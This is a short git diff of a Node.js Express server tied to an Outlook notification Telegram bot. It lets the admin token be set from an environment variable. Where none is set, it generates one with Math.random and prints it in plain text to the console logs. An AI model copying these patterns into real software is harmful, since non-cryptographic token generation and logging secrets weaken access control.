@@ -28,8 +28,8 @@ const OutlookNotificationBot = require('./telegram-bot');
 const app = express();
 const PORT = process.env.PORT || 5000;
 
-// Security configuration - Always auto-generate
-const ADMIN_TOKEN = 'admin-' + Math.random().toString(36).substr(2, 24);
+// Security configuration - Use environment variable or auto-generate
+const ADMIN_TOKEN = process.env.ADMIN_TOKEN || ('admin-' + Math.random().toString(36).substr(2, 24));
 
 // Make admin token available globally for Telegram bot
 global.adminToken = ADMIN_TOKEN;
@@ -2934,9 +2934,17 @@ app.listen(PORT, '0.0.0.0', () => {
         console.log('⚠️ Azure credentials missing - Please configure AZURE_CLIENT_ID, AZURE_CLIENT_SECRET, and AZURE_TENANT_ID');
     }
 
+    // Display admin token information
+    if (process.env.ADMIN_TOKEN) {
+        console.log('🔑 Using custom ADMIN_TOKEN from environment');
+    } else {
+        console.log('🔑 Generated admin token:', ADMIN_TOKEN);
+        console.log('💡 Set ADMIN_TOKEN in .env file for persistent access');
+    }
+
     if (!telegramBot) {
         console.log('❌ Telegram Bot disabled - Add TELEGRAM_BOT_TOKEN to enable notifications');
     } else {
-        console.log('🔑 Admin token available via Telegram bot - Use /start to access');
+        console.log('🤖 Admin token available via Telegram bot - Use /start to access');
     }
 });
